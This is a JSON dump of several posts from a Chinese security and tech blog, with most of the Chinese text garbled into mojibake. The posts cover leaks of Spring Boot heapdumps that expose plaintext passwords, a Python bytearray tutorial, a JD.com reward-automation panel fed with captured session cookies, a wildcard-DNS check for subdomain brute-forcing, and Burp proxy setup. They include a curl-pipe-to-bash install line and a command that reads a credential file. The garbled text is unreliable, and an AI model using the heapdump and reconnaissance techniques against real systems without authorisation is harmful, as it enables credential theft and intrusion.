dumpæ–‡ä»¶å‰ä¼šè§¦å‘ä¸€æ¬¡FullGCï¼Œæ‰€ä»¥heap dumpæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯FullGCåç•™ä¸‹çš„å¯¹è±¡ä¿¡æ¯ã€‚å…¶ä¸­å¯èƒ½ä¼šå«æœ‰æ•æ„Ÿæ•°æ®ï¼Œå¦‚æ•°æ®åº“çš„å¯†ç æ˜æ–‡ç­‰ ç›´æ¥è®¿é—®è·¯å¾„ä¼šè¿”å›ä¸€ä¸ªGZipå‹ç¼©çš„JVMå †dumpï¼Œå…¶ä¸­æ˜¯jvm heapä¿¡æ¯ã€‚ä¸‹è½½çš„heapdumpæ–‡ä»¶å¤§å°é€šå¸¸åœ¨ 50Mâ€”500M ä¹‹é—´ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯èƒ½ä¼šå¤§äº 2G ä¸‹è½½å®Œæˆä¹‹åå¯ä»¥å€ŸåŠ©ä¸€äº›å·¥å…·å¯¹å…¶ä¸­çš„æ•°æ®è¿›è¡Œå†…å®¹æ£€ç´¢ï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯ Eclipse Memory Analyzerï¼ˆMATï¼‰ heapdump_tool JDumpSpider å››ã€SpringBoot-Scançš„ä½¿ç”¨æ—¥å¸¸æ¸—é€è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°Spring Bootæ­å»ºçš„å¾®æœåŠ¡ï¼Œäºæ˜¯å°±æƒ³åšä¸€ä¸ªé’ˆå¯¹Spring Bootçš„å¼€æºæ¸—é€æ¡†æ¶ ä¸»è¦ç”¨ä½œæ‰«æSpringBootçš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ç«¯ç‚¹ï¼Œå¹¶å¯ä»¥ç›´æ¥æµ‹è¯•Spring Bootçš„ç›¸å…³é«˜å±æ¼æ´ã€‚ å¼€æºåœ°å€ï¼šhttps://github.com/AabyssZG/SpringBoot-Scan äº”ã€å‚è€ƒé“¾æ¥ https://blog.csdn.net/u012206617/article/details/109010102 https://blog.csdn.net/m0_64867220/article/details/121728868 https://www.freebuf.com/vuls/289710.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://wolke.cn/tags/SpringBoot/"}],"author":"w01ke"},{"title":"Pythonçš„bytearrayå’Œbytes","slug":"Pythonçš„bytearrayå’Œbytes","date":"2022-12-21T07:33:30.000Z","updated":"2022-12-21T07:37:05.402Z","comments":true,"path":"post/5bd337c9.html","link":"","permalink":"https://wolke.cn/post/5bd337c9.html","excerpt":"","text":"ä¸€ã€bytearrayå‡½æ•°ç®€ä»‹ã€æè¿°ã€‘ bytearray() æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°å­—èŠ‚æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„é‡Œçš„å…ƒç´ æ˜¯å¯å˜çš„ï¼Œå¹¶ä¸”æ¯ä¸ªå…ƒç´ çš„å€¼èŒƒå›´: 0 &lt;= x &lt; 256ã€‚ ã€è¯­æ³•ã€‘ class bytearray([source[, encoding[, errors]]]) ã€å‚æ•°ã€‘ å¦‚æœ source ä¸ºæ•´æ•°ï¼Œåˆ™è¿”å›ä¸€ä¸ªé•¿åº¦ä¸º source çš„åˆå§‹åŒ–æ•°ç»„ï¼› å¦‚æœ source ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰ç…§æŒ‡å®šçš„ encoding å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼› å¦‚æœ source ä¸ºå¯è¿­ä»£ç±»å‹ï¼Œåˆ™å…ƒç´ å¿…é¡»ä¸º[0 ,255] ä¸­çš„æ•´æ•°ï¼›ï¼ˆåˆšå¥½æ˜¯28ï¼Œä¸€ä¸ªå­—èŠ‚å°±æ˜¯8æ¯”ç‰¹ï¼‰ å¦‚æœ source ä¸ºä¸ buffer æ¥å£ä¸€è‡´çš„å¯¹è±¡ï¼Œåˆ™æ­¤å¯¹è±¡ä¹Ÿå¯ä»¥è¢«ç”¨äºåˆå§‹åŒ– bytearrayã€‚ å¦‚æœæ²¡æœ‰è¾“å…¥ä»»ä½•å‚æ•°ï¼Œé»˜è®¤å°±æ˜¯åˆå§‹åŒ–æ•°ç»„ä¸º0ä¸ªå…ƒç´ ã€‚ ã€è¿”å›å€¼ã€‘ è¿”å›æ–°å­—èŠ‚æ•°ç»„ï¼Œå¯å˜å­—èŠ‚åºåˆ— bytearray æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾ï¼Œè¾“å‡ºçš„æ—¶å€™æœ€å‰é¢ä¼šæœ‰ä¸€ä¸ªå­—ç¬¦ b æ ‡è¯†ã€‚ äºŒã€å®ä¾‹a = bytearray() # å®šä¹‰ç©ºçš„å­—èŠ‚åºåˆ—bytearrayb = bytearray(3) # å®šä¹‰æŒ‡å®šä¸ªæ•°çš„å­—èŠ‚åºåˆ—bytesï¼Œé»˜è®¤ä»¥0å¡«å……ï¼Œä¸èƒ½æ˜¯æµ®ç‚¹æ•°c = bytearray(&quot;w01ke&quot;, &quot;utf-8&quot;)d = bytearray([1, 2, 3]) # å¯è¿­ä»£ç±»å‹print(a)print(b)print(c)print(d)try: e = bytearray([1, 2, 256]) # æŠ¥é”™ print(e)except ValueError as f: print(f) â€‹ è¾“å‡º bytearray(b&#x27;&#x27;)bytearray(b&#x27;\\x00\\x00\\x00&#x27;)bytearray(b&#x27;w01ke&#x27;)bytearray(b&#x27;\\x01\\x02\\x03&#x27;)byte must be in range(0, 256) â€‹ æ¥ä¸‹æ¥æ¥æ¢ç©¶å­—èŠ‚åºåˆ—å…·ä½“çš„æ¯ä¸ªå­—èŠ‚çš„å€¼æ˜¯å¤šå°‘ b = bytearray(3) # å®šä¹‰æŒ‡å®šä¸ªæ•°çš„å­—èŠ‚åºåˆ—bytesï¼Œé»˜è®¤ä»¥0å¡«å……ï¼Œä¸èƒ½æ˜¯æµ®ç‚¹æ•°c = bytearray(&quot;w01ke&quot;, &quot;utf-8&quot;)d = bytearray([1, 2, 3]) # å¯è¿­ä»£ç±»å‹print(b)for i in range(len(b)): print(b[i])print(c)for i in range(len(c)): print(c[i])print(d)for i in range(len(d)): print(d[i]) â€‹ ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªå­—èŠ‚çš„å€¼å°±æ˜¯å¯¹åº”çš„ASCIIç ï¼ˆåè¿›åˆ¶ï¼‰ bytearray(b&#x27;\\x00\\x00\\x00&#x27;)000bytearray(b&#x27;w01ke&#x27;)1194849107101bytearray(b&#x27;\\x01\\x02\\x03&#x27;)123 ä¸‰ã€ä¸byteså‡½æ•°çš„åŒºåˆ«å…¶ä»–éƒ½ä¸€æ ·ã€‚ä¸åŒçš„æ˜¯bytesä¸ºä¸å¯å˜å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç”±ä¸€ä¸ªä¸ªbyteï¼ˆäºŒè¿›åˆ¶0-255æ•°å€¼ï¼‰ç»„æˆçš„stråºåˆ—ã€‚bytearrayä¸ºå¯å˜å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ä¸€ç»„äºŒè¿›åˆ¶æ•°å€¼çš„ï¼ˆ0-255ï¼‰çš„liståºåˆ—ã€‚ä¸¾ä¾‹å¦‚ä¸‹ a = b&#x27;w01ke&#x27; # bytesç±»å‹ï¼Œä¸å¯å˜å­—èŠ‚åºåˆ—print(type(a))for i in a: print(i, end=&quot; &quot;)a[0] = &quot;A&quot; # ä¼šæŠ¥é”™&#x27;&#x27;&#x27;è¾“å‡ºç»“æœ&lt;class &#x27;bytes&#x27;&gt;119 48 49 107 101 Traceback (most recent call last):File &quot;C:\\\\Users\\\\86147\\\\Desktop\\\\demo.py&quot;, line 6, in &lt;module&gt;a[0] = &quot;A&quot;TypeError: &#x27;bytes&#x27; object does not support item assignment&#x27;&#x27;&#x27; â€‹ å¦‚æœæ¢æˆbytearrayç±»å‹å³å¯ä¿®æ”¹å†…å®¹ a = b&#x27;w01ke&#x27; # bytesç±»å‹ï¼Œä¸å¯å˜å­—èŠ‚åºåˆ—print(type(a))a = bytearray(a)print(type(a))for i in a: print(i, end=&quot; &quot;)a[0] = 65print(&quot;\\n&quot;)print(a)&#x27;&#x27;&#x27;è¾“å‡ºç»“æœD:\\\\Python3.7.9\\\\python.exe C:\\\\Users\\\\86147\\\\Desktop\\\\demo.py &lt;class &#x27;bytes&#x27;&gt;&lt;class &#x27;bytearray&#x27;&gt;119 48 49 107 101 bytearray(b&#x27;A01ke&#x27;)&#x27;&#x27;&#x27;","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"é’é¾™é¢æ¿â€”â€”æ¯æ—¥è‡ªåŠ¨æ‹¿äº¬è±†","slug":"é’é¾™é¢æ¿â€”â€”æ¯æ—¥è‡ªåŠ¨æ‹¿äº¬è±†","date":"2022-12-16T15:33:17.000Z","updated":"2022-12-16T15:43:43.879Z","comments":true,"path":"post/e7b0b2b0.html","link":"","permalink":"https://wolke.cn/post/e7b0b2b0.html","excerpt":"","text":"ä¸€ã€å‰è¨€é’é¾™é¢æ¿æ˜¯ä¸€ä¸ªå¯è§†åŒ–çš„é¢æ¿ï¼Œåœ¨ä¸Šé¢å¯ä»¥éƒ¨ç½²æˆ‘ä»¬çš„è®¡åˆ’ä»»åŠ¡ï¼Œè‡ªåŠ¨åœ¨ç‰¹å®šæ—¶é—´æ‰§è¡Œäº¬ä¸œé¢†äº¬è±†ã€äº¬å–œç‰§åœºå…»é¸¡ã€äº¬ä¸œç‰¹ä»·ç‰ˆçœ‹è§†é¢‘é¢†é‡‘å¸ç­‰ç­‰ã€‚ é¦–å…ˆå¾—å‡†å¤‡ä¸€å°äº‘æœåŠ¡å™¨ï¼Œè¿™é‡Œæˆ‘è‡ªå·±åœ¨ç”¨çš„æ˜¯è…¾è®¯äº‘çš„æœåŠ¡å™¨https://url.cn/mn32xpJz , CentOS 7ï¼Œä»·æ ¼ä¾¿å®œï¼Œé™åˆ¶ç›¸æ¯”å¦å¤–ä¸€å®¶ä¹Ÿå°‘ï¼ˆddddï¼‰ï¼Œæ§åˆ¶å°å¼€å‘ç¥¨ä¹Ÿæ–¹ä¾¿ã€‚ äºŒã€å®‰è£…docker å·²ç»å®‰è£…Dockerçš„å¯ä»¥è·³è¿‡è¿™ä¸€æ­¥ï¼Œæ²¡æœ‰å®‰è£…çš„å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç›´æ¥å®‰è£…Dockerã€‚ curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun å®‰è£…Dockerå¯åŠ¨Dockerï¼Œé…ç½®å¼€æœºå¯åŠ¨ sudo systemctl start docker #å¯åŠ¨Dockersudo systemctl enable docker #é…ç½®å¼€æœºè‡ªå¯ ä¸‰ã€å®‰è£…docker-composesudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose å››ã€å¯åŠ¨å®¹å™¨mkdir qinglongwget https://raw.githubusercontent.com/whyour/qinglong/master/docker/docker-compose.yml# å¯åŠ¨docker-compose up -d# åœæ­¢docker-compose down æ‰“å¼€ä½ çš„æµè§ˆå™¨ï¼Œè®¿é—® http://{ip}:5700 äº”ã€æ‰“å¼€é˜²ç«å¢™é’é¾™é¢æ¿é»˜è®¤ç«¯å£æ˜¯5700ï¼Œè®°å¾—åœ¨é˜²ç«å¢™ä¸Šè®¾ç½®æ”¾è¡Œã€‚è…¾è®¯äº‘å¯ä»¥åœ¨å®‰å…¨ç»„ä¸­è®¾ç½® å…­ã€é…ç½®é’é¾™1ã€é¢æ¿å¤„è®¾ç½®åˆå§‹é¡µé¢ä¼šè®©æˆ‘ä»¬è®¾ç½®å¯†ç ä»¥åŠæ¨é€æœºå™¨äººï¼Œæœºå™¨äººæˆ‘é€‰æ‹©çš„æ˜¯Serveré…±ï¼Œå½“ç„¶å…¶å®ä¹Ÿå¯ä»¥ä¸é…ç½®æœºå™¨äººï¼Œå› ä¸ºå‡ ä¹æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæˆ‘ä»¬éœ€è¦çš„åªæ˜¯è‡ªåŠ¨è¿è¡Œè„šæœ¬ï¼Œé€šçŸ¥è¿™ä¸ªåŠŸèƒ½åªæ˜¯æ¬¡è¦ã€‚ å¦‚æœå¿˜è®°äº†é¢æ¿å¯†ç ï¼Œå¯ä»¥åœ¨è¯¥auth.jsonä¸‹æ‰¾åˆ° cat /root/qinglong/data/config/auth.json 2ã€æ·»åŠ å®šæ—¶ä»»åŠ¡é’é¾™é¢æ¿æœ¬èº«ä¸å…·å¤‡ä»»ä½•è„šæœ¬åŠŸèƒ½ï¼Œåªæ˜¯ä¸€ä¸ªç®¡ç†å’Œæ‰§è¡Œç›¸åº”è„šæœ¬çš„å¹³å°ã€‚ ç‚¹å‡»å®šæ—¶ä»»åŠ¡â€“&gt;æ·»åŠ ä»»åŠ¡ è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåº“ Fakeåº“ï¼šql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git &quot;jd_|jx_|getJDCookie&quot; &quot;activity|backUp&quot; &quot;^jd[^_]|USER|ZooFaker_Necklace&quot;KingRan/KRï¼šql repo https://github.com/KingRan/KR.git &quot;jd_|jx_|jdCookie&quot; &quot;activity|backUp&quot; &quot;^jd[^_]|USER|utils|function|sign|sendNotify|ql|JDJR&quot; å®šæ—¶è§„åˆ™å¦‚ä¸‹ ç§’ åˆ† æ—¶ å¤© æœˆ å‘¨ 3ã€è·å–Cookieç”µè„‘ç«¯å¯ä»¥ä½¿ç”¨ç½‘é¡µç™»å½•äº¬ä¸œè´¦å·åä½¿ç”¨å¼€å‘è€…å·¥å…·â€“Networkæ•æ‰Cookieï¼Œæ‰‹æœºç«¯å¯ä»¥ä½¿ç”¨Alookæµè§ˆå™¨ç™»å½•åæ•æ‰Cookieã€‚æˆ‘ä»¬è·å–åˆ°çš„Cookieæ˜¯å¾ˆé•¿ä¸€ä¸²çš„ï¼Œä½†æˆ‘ä»¬åªéœ€è¦pt_keyå’Œpt_pinå³å¯ï¼Œæ ¼å¼å¦‚ä¸‹ pt_key=xxxx;pt_pin=xxxx; 4ã€æ–°å»ºç¯å¢ƒå˜é‡ç¯å¢ƒå˜é‡â€“&gt;æ·»åŠ å˜é‡ï¼Œåç§°ä¸ºJD_COOKIEï¼Œå€¼ä¸ºåˆšå¤åˆ¶çš„äº¬ä¸œè´¦å·Cookieï¼Œå¤‡æ³¨è‡ªå·±å¡«æ–¹ä¾¿è¯†åˆ«ï¼Œåˆ«çš„ä¸éœ€è¦åŠ¨ã€‚æ·»åŠ åç‚¹ç¡®å®šå°±å¯ä»¥ï¼Œ å¦‚æœéœ€è¦æ·»åŠ å¤šä¸ªè´¦å·ï¼Œåªéœ€è¦è·å–å¤šä¸ªCookieæ·»åŠ ä¸Šå»å°±å¯ä»¥äº†ï¼Œåç§°ä»ç„¶ä¸ºJD_COOKIEã€‚ pt_key=xxxx;pt_pin=xxxx;&amp;pt_key=xxxx;pt_pin=xxxx; å®Œæ¯•ï¼Œæ¥ä¸‹æ¥ç­‰å¾…è„šæœ¬è‡ªå·±è¿è¡Œå³å¯ã€‚ ä¸ƒã€å…¶ä»–ï¼ˆ1ï¼‰å°†äº¬ä¸œè´¦å·ç»‘å®šå¾®ä¿¡ï¼šæœ‰çš„æ´»åŠ¨çº¢åŒ…ä¼šè‡ªåŠ¨ä½“ç°åˆ°å¾®ä¿¡ï¼Œè™½ç„¶ä¸å¤šï¼Œä½†æœ‰ ï¼ˆ2ï¼‰å¼€å¯äº¬ä¸œæ¸¸æˆä»»åŠ¡å»ºè®®æŠŠæ‰€æœ‰æ´»åŠ¨æ¸¸æˆéƒ½ç‚¹å‡»ä¸€æ¬¡ï¼Œäº¬ä¸œå·¥å‚è¿™ç§éœ€è¦è‡ªå·±é€‰äº§å“çš„å»ºè®®è‡ªå·±é€‰ï¼Œä¸ç„¶ä¼šè‡ªåŠ¨é€‰ä¸€ä¸ªï¼Œæœ‰çš„å¹²è„†ä¸é€‰ã€‚è¿™é‡Œç»™å¤§å®¶è¯´ä¸‹å„ä¸ªæ¸¸æˆå…¥å£ä½ç½®ï¼š äº¬ä¸œAPP æ‘‡é’±æ ‘ï¼šäº¬ä¸œAPPâ†’å³ä¸‹è§’æˆ‘çš„â†’ä¸­é—´æ›´å¤šå·¥å…· ä¸œä¸œèŒå® ï¼šäº¬ä¸œAPPâ†’å³ä¸‹è§’æˆ‘çš„ å® æ±ªæ±ªï¼šäº¬ä¸œAPPâ†’å³ä¸‹è§’æˆ‘çš„ ä¸œä¸œå†œåœºï¼šäº¬ä¸œAPPâ†’å³ä¸‹è§’æˆ‘çš„ é¦–æ¬¡ä¸‹è½½ç™»é™†æƒŠå–œAPPå¯ä»¥0.01å…ƒåŒ…é‚®ä¹°ä¸œè¥¿ï¼Œ&gt;æˆ³æˆ‘é¢†å–&lt; äº¬å–œå·¥å‚ï¼šæƒŠå–œAPPâ†’å³ä¸‹è§’æˆ‘çš„ äº¬å–œç‰§åœºï¼šæƒŠå–œAPPâ†’å³ä¸‹è§’æˆ‘çš„ äº¬å–œè´¢å¯Œå²›ï¼šæƒŠå–œAPPâ†’å³ä¸‹è§’æˆ‘çš„ é¦–æ¬¡ä¸‹è½½ç™»é™†äº¬ä¸œç‰¹ä»·ç‰ˆå¯ä»¥é¢†5-10å…ƒåˆ¸åŒ…é‚®ä¹°ä¸œè¥¿ å‘è´¢å¤§èµ¢å®¶ï¼šäº¬ä¸œæé€Ÿç‰ˆâ†’å³ä¸‹è§’æˆ‘çš„ æ±ªæ±ªä¹å›­ï¼šäº¬ä¸œæé€Ÿç‰ˆâ†’å³ä¸‹è§’æˆ‘çš„ ï¼ˆ3ï¼‰è´­ä¹°äº‘æœåŠ¡å™¨äº«æŠ˜æ‰£ ç‚¹å‡»ä¸‹é¢é“¾æ¥å»è´­ä¹°äº‘æœåŠ¡å™¨ï¼šhttps://url.cn/mn32xpJz äº«æŠ˜æ‰£ã€‚","categories":[{"name":"è–…ç¾Šæ¯›","slug":"è–…ç¾Šæ¯›","permalink":"https://wolke.cn/categories/%E8%96%85%E7%BE%8A%E6%AF%9B/"}],"tags":[{"name":"è–…ç¾Šæ¯›","slug":"è–…ç¾Šæ¯›","permalink":"https://wolke.cn/tags/%E8%96%85%E7%BE%8A%E6%AF%9B/"}],"author":"w01ke"},{"title":"å­åŸŸåçˆ†ç ´çš„æ³›è§£æé—®é¢˜","slug":"å­åŸŸåçˆ†ç ´çš„æ³›è§£æé—®é¢˜","date":"2022-11-23T08:54:23.000Z","updated":"2022-11-23T09:02:21.871Z","comments":true,"path":"post/9f38e83a.html","link":"","permalink":"https://wolke.cn/post/9f38e83a.html","excerpt":"","text":"å­—èŠ‚è·³åŠ¨â€”â€”æ¸—é€æµ‹è¯•å®ä¹ ç”Ÿé¢è¯•é¢˜ï¼šä¿¡æ¯æ”¶é›†å¦‚ä½•å¤„ç†å­åŸŸåçˆ†ç ´çš„æ³›è§£æé—®é¢˜ï¼Ÿ ä¸€ã€ä»€ä¹ˆæ˜¯åŸŸåæ³›è§£æ &emsp;&emsp;åˆ©ç”¨é€šé…ç¬¦* ï¼ˆæ˜Ÿå·ï¼‰æ¥åšæ¬¡çº§åŸŸåä»¥å®ç°æ‰€æœ‰çš„æ¬¡çº§åŸŸåå‡æŒ‡å‘åŒä¸€IPåœ°å€ã€‚åœ¨åŸŸåå‰æ·»åŠ ä»»ä½•å­åŸŸåï¼Œå‡å¯è®¿é—®åˆ°æ‰€æŒ‡å‘çš„IPåœ°å€ã€‚ å¸¸è§„åŸŸåè§£æwww.wolke.cn 10.10.10.10åŸŸåæ³›è§£æ*.wolke.cn 10.10.10.10è®¿é—®å­åŸŸåa.wolke.cnï¼Œb.wolke.cnç­‰å‡æŒ‡å‘10.10.10.10 &emsp;&emsp;è¿™ä¸ºæˆ‘ä»¬å»åšå­åŸŸåçˆ†ç ´å¸¦æ¥äº†æå¤§çš„ä¸ä¾¿ï¼Œä»¥å‰å­åŸŸåçˆ†ç ´å¸¸ç”¨çš„æ˜¯layerå­åŸŸåæŒ–æ˜æœºã€‚ä¸è¿‡layerå­åŸŸåæŒ–æ˜æœºåœ¨è·‘å…·æœ‰æ³›è§£æçš„ç«™çš„æ—¶å€™ï¼Œå°±ä¸æ˜¯é‚£ä¹ˆé€‚ç”¨ äºŒã€åŸŸåæ³›è§£æå¯¹æŠ— &emsp;&emsp;è¿™é‡Œä»¥æ·˜å®å’Œç™¾åº¦ä¸ºä¾‹å­ï¼špingä¸€ä¸ªç»å¯¹éšæœºä¸å¯èƒ½å­˜åœ¨çš„åŸŸåï¼Œå®ƒè§£æäº†ï¼Œé‚£ä¹ˆè¯´æ˜å®ƒå¤§æ¦‚ç‡ä½¿ç”¨äº†æ³›è§£æ &emsp;&emsp;æ·˜å®å¯èƒ½å­˜åœ¨åŸŸåæ³›è§£æğŸ‘‡ &emsp;&emsp;ç™¾åº¦å¯èƒ½ä¸å­˜åœ¨åŸŸåæ³›è§£æğŸ‘‡ &emsp;&emsp;é’ˆå¯¹ç™¾åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨layerå­åŸŸåæŒ–æ˜æœºç­‰å­åŸŸåçˆ†ç ´å·¥å…·ï¼Œè€Œé’ˆå¯¹æ·˜å®çš„èµ„äº§,æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨layerå­åŸŸåæŒ–æ˜æœºç­‰å¸¸è§„å·¥å…· 1ã€åˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†æ³›è§£æ&emsp;&emsp;æ€è·¯ï¼šäº”æ¬¡å®Œå…¨éšæœºçš„åŸŸåå‰ç¼€Aè®°å½•è§£æ import asyncioimport aiodnsimport randomloop = asyncio.get_event_loop()resolver = aiodns.DNSResolver(loop=loop)async def query(name, query_type): return await resolver.query(name, query_type)def random_to_A(main_domain): total = [] # éšæœºå¾ªç¯äº”æ¬¡ for i in range(5): sub_domain = &quot;&quot;.join(random.sample(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;, random.randint(8, 12))) res = query(sub_domain + &quot;.&quot; + main_domain, &#x27;A&#x27;) result = loop.run_until_complete(res) total.append(result) return totalif __name__ == &#x27;__main__&#x27;: main_domain = input(&quot;Please input the main_doamin: &quot;) print(str(random_to_A(main_domain)).replace(&quot;],&quot;, &quot;],\\n&quot;)) &emsp;&emsp;äº”æ¬¡å®Œå…¨Aè®°å½•è§£ææˆåŠŸï¼Œè®¤ä¸ºå­˜åœ¨æ³›è§£æï¼Œå¦‚æœä¸å­˜åœ¨æ³›è§£æé—®é¢˜ï¼Œå°±å¸¸è§„å­åŸŸåæ”¶é›†ä¸€æŠŠæ¢­ï¼Œå¦‚æœæ£€æµ‹å‡ºæ³›è§£æï¼Œå°±ä½¿ç”¨ç ´æ³›è§£æçš„å­åŸŸåçˆ†ç ´å·¥å…·ã€‚ 2ã€CNAMEæŸ¥è¯¢é»‘åå•&emsp;&emsp;æ€è·¯ï¼šç»´æŠ¤ç‰¹å®šå‚å•†CNAMEåˆ—è¡¨ &emsp;&emsp;CNAMEæŸ¥è¯¢å‡ ä¸ªä¸å­˜åœ¨çš„æ·˜å®åŸŸåï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„æ€è·¯ï¼Œå¾ªç¯å¤šæ¬¡ä¸å­˜åœ¨çš„åŸŸåï¼Œå¦‚æœè®¿é—®ä¸å­˜åœ¨çš„åŸŸåï¼ŒCNAMEä¸ºshop.taobao.com 3ã€Aè®°å½•æŸ¥è¯¢å‘½ä¸­æ¬¡æ•°&emsp;&emsp;å¦‚æœAè®°å½•æŸ¥è¯¢ï¼Œå‘½ä¸­ç›¸åŒip&gt;10ï¼Œåç»­çš„çˆ†ç ´Aè®°å½•è§£æçš„åŸŸåå°±ä¸å±•ç¤ºè®°å½• ä¸‰ã€è„šæœ¬æºç &emsp;&emsp;é™„ä¸Šè‡ªå·±ç¼–å†™çš„ç®€å•çš„æ³›è§£æè¯†åˆ«è„šæœ¬æºç  import asyncioimport aiodnsimport randomimport optparseloop = asyncio.get_event_loop()resolver = aiodns.DNSResolver(loop=loop)async def query(name, query_type): return await resolver.query(name, query_type)def random_to_A(main_domain): total = [] # éšæœºå¾ªç¯äº”æ¬¡ for i in range(5): sub_domain = &quot;&quot;.join(random.sample(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;, random.randint(8, 12))) res = query(sub_domain + &quot;.&quot; + main_domain, &#x27;A&#x27;) result = loop.run_until_complete(res) total.append(result) return totaldef random_to_cname(sub_domain): res = query(sub_domain, &#x27;CNAME&#x27;) result = loop.run_until_complete(res) return resultif __name__ == &#x27;__main__&#x27;: parser = optparse.OptionParser(&quot;%prog &quot; + &quot;[options] [domain]&quot;) parser.add_option(&#x27;-a&#x27;, action=&quot;store&quot;, dest=&#x27;main_domain&#x27;, type=&#x27;string&#x27;, help=&#x27;&#x27;) parser.add_option(&#x27;-c&#x27;, action=&quot;store&quot;, dest=&#x27;sub_domain&#x27;, type=&#x27;string&#x27;, help=&#x27;&#x27;) (options, args) = parser.parse_args() main_domain = options.main_domain sub_domain = options.sub_domain if main_domain: print(str(random_to_A(main_domain)).replace(&quot;],&quot;, &quot;],\\n&quot;)) elif sub_domain: print(str(random_to_cname(sub_domain)).replace(&quot;&lt;&quot;, &quot;\\n&lt;&quot;)) å››ã€å‚è€ƒé“¾æ¥ https://www.cnblogs.com/piaomiaohongchen/p/15959042.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://wolke.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"å­åŸŸåçˆ†ç ´","slug":"å­åŸŸåçˆ†ç ´","permalink":"https://wolke.cn/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4/"}],"author":"w01ke"},{"title":"ä¸€æ¬¡burpæ— æ³•æŠ“å¾®ä¿¡PCç«¯å°ç¨‹åºçš„å¤´ç–¼ç»å†ä»¥åŠè§£å†³æ–¹æ¡ˆ","slug":"ä½¿ç”¨burpå¯¹å¾®ä¿¡å…¬ä¼—å·ã€å°ç¨‹åºæŠ“åŒ…","date":"2022-08-22T16:37:23.000Z","updated":"2022-08-22T17:10:08.072Z","comments":true,"path":"post/af7cceea.html","link":"","permalink":"https://wolke.cn/post/af7cceea.html","excerpt":"","text":"ä»Šå¤©æƒ³ç”¨burpå¯¹PCçš„å¾®ä¿¡å°ç¨‹åºè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°æ€ä¹ˆæŠ“ä¹ŸæŠ“ä¸åˆ°ï¼Œæ˜æ˜ä¹‹å‰å¯ä»¥æŠ“çš„ï¼Œç»è¿‡å‡ å°æ—¶çš„ç ”ç©¶å’Œèµ„æ–™æœé›†ï¼Œç»ˆäºè§£å†³ã€‚é¡ºæ‰‹æŠŠå¦‚ä½•å¯¹æ‰‹æœº/æ¨¡æ‹Ÿå™¨è¿›è¡ŒæŠ“åŒ…ä¹Ÿå†™äº†ä¸‹ï¼Œåœ¨æ–‡æœ«æˆ‘ä¼šæåˆ°æ˜¯å¦‚ä½•è§£å†³è¿™ä¸ªå¤´ç–¼ä¸”æ·±åˆ»çš„é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ç›¸ä¿¡å¤§å®¶åº”è¯¥éƒ½ä¼šæœ‰ï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆ°å¤§å®¶ã€‚ ä¸€ã€æŠ“æ‰‹æœº/æ¨¡æ‹Ÿå™¨çš„å¾®ä¿¡å…¬ä¼—å·ã€å°ç¨‹åºã€APPå‰æï¼šä¿è¯ç”µè„‘å’Œæ‰‹æœºåœ¨åŒä¸€å±€åŸŸç½‘ ï¼ˆ1ï¼‰åˆé˜¶ç”µè„‘ç«¯ä½¿ç”¨ipconfigæŸ¥çœ‹å½“å‰IPåœ°å€ æ‰‹æœºç«¯æ‰“å¼€WLANè®¾ç½®ï¼Œæ‰‹åŠ¨æŒ‡å®šä»£ç†ï¼Œä»£ç†IPåœ°å€ä¸ºç”µè„‘ç«¯çš„IPåœ°å€ä¾‹å¦‚ä¸Šé¢çš„192.168.43.170ï¼Œç«¯å£è®¾ç½®ä¸ºä¾‹å¦‚8081 æ­¤æ—¶æ‰“å¼€burpï¼Œè®¾ç½®ç›‘å¬ï¼ˆéæœ¬åœ°å›ç¯åœ°å€ï¼‰ æ­¤æ—¶ï¼Œburpå°±èƒ½æŠ“æ‰‹æœºè®¿é—®ç½‘é¡µçš„åŒ…äº†ã€‚ 